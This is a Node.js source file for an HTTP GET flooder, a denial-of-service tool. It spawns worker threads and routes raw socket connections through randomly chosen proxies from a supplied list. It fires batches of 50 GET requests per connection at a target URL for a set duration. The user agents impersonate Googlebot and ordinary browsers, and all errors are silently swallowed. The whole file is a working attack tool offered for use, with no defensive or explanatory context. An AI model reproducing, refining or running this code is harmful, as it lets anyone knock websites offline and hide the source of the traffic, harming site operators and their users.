//stretching is cool
//simple get flooder with threading added
process.setMaxListeners(0);
const {
  Worker, isMainThread, parentPort, workerData
} = require('worker_threads');

if (isMainThread) {
for (pas = 0; pas < parseInt(process.argv[5]); pas++) {
        var shit = new Worker(__filename, {
                workerData: process.argv
        });
}
setTimeout(() => {
    process.exit(1);
}, process.argv[4] * 1000);


} else {

process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});

const net = require('net');
const fs = require('fs');
const url = require('url');

var path = require("path");
let args = workerData.slice(3);
let proxiesPath = args[0];

const execSync = require('child_process').execSync;

var fileName = __filename;
var file = path.basename(fileName);
try {
    var proxies = fs.readFileSync(proxiesPath).toString().match(/\S+/g)
} catch (err) {
    if (err.code !== 'ENOENT') throw err;
    console.log('\x1b[31m [+]\x1b[37m Could not parse for the proxy list.');
    process.exit();
}
function randomInt(n) {
    return Math.floor(Math.random() * n);
}

function randomProxy() {
    return proxies[randomInt(proxies.length)];
}


var target = workerData[2];
var parsed = url.parse(target);


const UAs = [
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)",
    "Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML, like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"

];



if (!workerData[4]) {
    console.log("\x1b[31m [+]\x1b[37m Could not parse for the time.");
    process.exit();
}

if (isNaN(workerData[4])) {
    console.log('\x1b[31m [+]\x1b[37m Could not parse for the time.');
    process.exit();
}

if (!workerData[2] !== !workerData[2].startsWith('http://') && !workerData[2].startsWith('https://')) {
    console.log('\x1b[31m [+]\x1b[37m Could not parse for the url.');
    process.exit();
}

console.log("\x1b[36m[+]\x1b[37m The script has been successfully loaded.");
console.log("\x1b[36m[+]\x1b[37m Proxies: %s", workerData[3]);
console.log("\x1b[36m[+]\x1b[37m Flooding: %s", workerData[2]);




setInterval(function() {
    var proxy = randomProxy();
    proxy = proxy.split(':');
    var socket = net.connect(proxy[1], proxy[0]);
    socket.once('error', err => {
    });

    socket.once('disconnect', () => {
        console.log('Disconnect');
    });

    socket.once('data', data => {
    });
    for (let j = 0; j < 50; j++) {
         socket.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\n\r\n');
    }
});

}


